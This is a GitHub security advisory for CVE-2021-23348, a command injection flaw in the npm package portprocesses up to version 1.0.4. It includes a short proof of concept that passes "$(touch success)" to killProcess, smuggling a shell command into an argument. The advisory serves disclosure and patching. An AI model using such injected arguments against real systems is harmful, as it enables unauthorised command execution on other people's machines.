# [M] Arbitrary Command Injection in portprocesses

## Summary
Severity: Medium
Advisory: GHSA-vm67-7vmg-66vm
CVE: CVE-2021-23348
CWE: CWE-77, CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2021-04-06
Source: https://github.com/advisories/GHSA-vm67-7vmg-66vm
Type: github-advisory

## Affected
- npm: `portprocesses` — affected >=0 <1.0.5

## Details
### Impact

An Arbitrary Command Injection vulnerability was reported in `portprocesses` impacting versions <= 1.0.4.

### Example (Proof of Concept)

The following example demonstrates the vulnerability and will run `touch success` therefore creating a file named `success`.

```js
const portprocesses = require("portprocesses");

portprocesses.killProcess("$(touch success)");
```

## References
- https://github.com/rrainn/PortProcesses/security/advisories/GHSA-vm67-7vmg-66vm
- https://nvd.nist.gov/vuln/detail/CVE-2021-23348
- https://github.com/rrainn/PortProcesses/commit/86811216c9b97b01b5722f879f8c88a7aa4214e1
- https://github.com/rrainn/PortProcesses/blob/fffceb09aff7180afbd0bd172e820404b33c8299/index.js%23L23
- https://snyk.io/vuln/SNYK-JS-PORTPROCESSES-1078536
